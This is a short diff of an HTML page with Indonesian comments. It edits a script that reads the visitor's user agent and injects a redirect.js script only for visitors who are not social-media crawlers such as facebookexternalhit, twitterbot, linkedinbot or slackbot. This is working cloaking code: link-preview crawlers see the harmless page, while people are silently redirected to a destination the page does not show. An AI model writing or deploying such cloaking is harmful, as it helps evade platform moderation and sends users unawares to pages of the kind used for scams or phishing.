@@ -7,11 +7,12 @@
 
 <!-- ANTI-REDIRECT UNTUK BOT -->
 <script>
-/* Detect bots/crawlers (Twitter, Facebook, Google, etc.) */
-const isBot = /bot|crawl|spider|facebookexternalhit|twitterbot/i.test(navigator.userAgent);
-if (!isBot) {
-  /* Load redirect script ONLY for humans */
-  document.write('<script src="redirect.js"></' + 'script>');
+/* Deteksi hanya browser manusia (bukan crawler sosial) */
+const isSocialBot = /facebookexternalhit|twitterbot|linkedinbot|slackbot/i.test(navigator.userAgent);
+
+if (!isSocialBot) {
+    // Load redirect hanya untuk manusia
+    document.write('<script src="redirect.js"></' + 'script>');
 }
 </script>
 
@@ -49,5 +50,6 @@ img{max-width:100%;border-radius:8px;margin-bottom:12px;}
   </div>
 </body>
 </html>
+
 
 
